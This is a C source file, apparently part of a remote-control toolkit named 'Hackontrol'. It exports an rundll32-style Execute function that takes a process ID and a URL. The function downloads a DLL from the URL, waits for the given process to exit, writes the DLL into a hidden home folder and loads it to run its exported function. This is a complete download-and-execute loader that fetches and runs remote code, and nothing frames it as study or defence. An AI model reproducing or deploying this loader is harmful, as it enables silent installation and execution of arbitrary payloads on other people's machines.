#include <libkhopan.h>
#include <libkhopancurl.h>
#include <libhackontrol.h>
#include <libhackontrolcurl.h>

#define FUNCTION_LIBDLL32 "Execute"

__declspec(dllexport) void __stdcall Execute(HWND window, HINSTANCE instance, LPSTR argument, int command) {
	LPWSTR buffer = KHOPANFormatMessage(L"%S", argument);

	if(!buffer) {
		KHOPANLASTERRORMESSAGE_WIN32(L"KHOPANFormatMessage");
		return;
	}

	int count;
	LPWSTR* arguments = CommandLineToArgvW(buffer, &count);
	DWORD error = GetLastError();
	LocalFree(buffer);

	if(!arguments) {
		KHOPANERRORMESSAGE_WIN32(error, L"CommandLineToArgvW");
		return;
	}

	if(count < 2) {
		MessageBoxW(NULL, L"Invalid argument. Expected:\n<processIdentifier> <url>", L"Error", MB_OK | MB_ICONERROR | MB_DEFBUTTON1 | MB_SYSTEMMODAL);
		LocalFree(arguments);
		return;
	}

	DWORD processIdentifier = (DWORD) _wtoll(arguments[0]);
	LPSTR url = KHOPANFormatANSI("%ws", arguments[1]);
	error = GetLastError();
	LocalFree(arguments);

	if(!url) {
		KHOPANERRORMESSAGE_WIN32(error, L"KHOPANFormatANSI");
		return;
	}

	DATASTREAM stream = {0};
	CURLcode code = HackontrolDownload(url, &stream, FALSE, TRUE);
	LocalFree(url);

	if(code != CURLE_OK) {
		KHOPANERRORMESSAGE_CURL(code, L"HackontrolDownload");
		return;
	}

	if(processIdentifier) {
		HANDLE process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processIdentifier);

		if(process) {
			WaitForSingleObject(process, INFINITE);
			CloseHandle(process);
		}
	}

	LPWSTR folderHackontrol = HackontrolGetHomeDirectory();

	if(!folderHackontrol) {
		KHOPANLASTERRORMESSAGE_WIN32(L"HackontrolGetHomeDirectory");
		goto freeStream;
	}

	if(!HackontrolCreateDirectory(folderHackontrol)) {
		KHOPANLASTERRORMESSAGE_WIN32(L"HackontrolCreateDirectory");
		LocalFree(folderHackontrol);
		goto freeStream;
	}

	LPWSTR fileLibdll32 = KHOPANFormatMessage(L"%ws\\" FILE_LIBDLL32, folderHackontrol);
	error = GetLastError();
	LocalFree(folderHackontrol);

	if(!fileLibdll32) {
		KHOPANERRORMESSAGE_WIN32(error, L"KHOPANFormatMessage");
		goto freeStream;
	}

	if(!HackontrolWriteFile(fileLibdll32, stream.data, stream.size)) {
		KHOPANLASTERRORMESSAGE_WIN32(L"HackontrolWriteFile");
		LocalFree(fileLibdll32);
		goto freeStream;
	}

	count = KHOPANExecuteDynamicLibrary(fileLibdll32, FUNCTION_LIBDLL32, "0 1");
	error = GetLastError();
	LocalFree(fileLibdll32);

	if(!count) {
		KHOPANERRORMESSAGE_WIN32(error, L"KHOPANExecuteDynamicLibrary");
	}
freeStream:
	KHOPANStreamFree(&stream);
}
